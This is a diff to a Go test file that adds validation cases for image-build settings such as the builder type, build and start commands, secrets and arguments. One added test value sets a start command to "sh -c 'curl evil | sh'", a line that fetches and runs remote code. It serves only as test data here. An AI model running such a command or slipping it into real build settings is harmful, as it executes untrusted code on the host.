@@ -58,6 +58,20 @@ func TestABuildsSettingsAreCheckedAndWrittenOneWay(t *testing.T) {
 		{"an absolute Dockerfile", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.Dockerfile = "/etc/passwd" }), "can't start with /"},
 		{"a bad argument", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.Args = map[string]string{"1X": "y"} }), "isn't a build argument's name"},
 		{"a bad secret ID", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.Secrets = map[string]string{"a b": ""} }), "isn't a build secret's ID"},
+		{"a builder there isn't", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.Builder = 9 }), "isn't a builder"},
+		{"commands for a Dockerfile", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) {
+			b.Builder, b.StartCommand = resourcev1.ImageBuild_BUILDER_DOCKERFILE, "node server.js"
+		}), "takes no build or start command"},
+		{"a command of two lines", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.BuildCommand = "npm ci\nnpm run build" }), "is one line"},
+		{"a Dockerfile for Railpack", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) {
+			b.Builder, b.Dockerfile = resourcev1.ImageBuild_BUILDER_RAILPACK, "deploy/Dockerfile"
+		}), "takes no Dockerfile path or stage"},
+		{"a secret Railpack can't give", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) {
+			b.Builder, b.Secrets = resourcev1.ImageBuild_BUILDER_RAILPACK, map[string]string{"npm.token": "NPM"}
+		}), "as environment variables"},
+		{"PATH for Railpack", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) {
+			b.Builder, b.Args = resourcev1.ImageBuild_BUILDER_RAILPACK, map[string]string{"PATH": "/opt/bin"}
+		}), "is the build's own"},
 		{"an image of its own", func() *resourcev1.Service {
 			s := built("https://github.com/acme/web", nil)
 			s.GetApp().Image = "nginx:1.27"
@@ -126,6 +140,9 @@ func TestAServicesWriterIsItsCode(t *testing.T) {
 		"the Dockerfile":     built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.Dockerfile = "other/Dockerfile" }),
 		"the folder":         built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.Context = "other" }),
 		"the stage":          built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.Target = "debug" }),
+		"Railpack":           built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.Builder = resourcev1.ImageBuild_BUILDER_RAILPACK }),
+		"a start command":    built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.StartCommand = "sh -c 'curl evil | sh'" }),
+		"a build command":    built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.BuildCommand = "npm run build:prod" }),
 		"a commit as its ref": built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) {
 			b.GetGit().Ref = strings.Repeat("c", 40)
 		}),
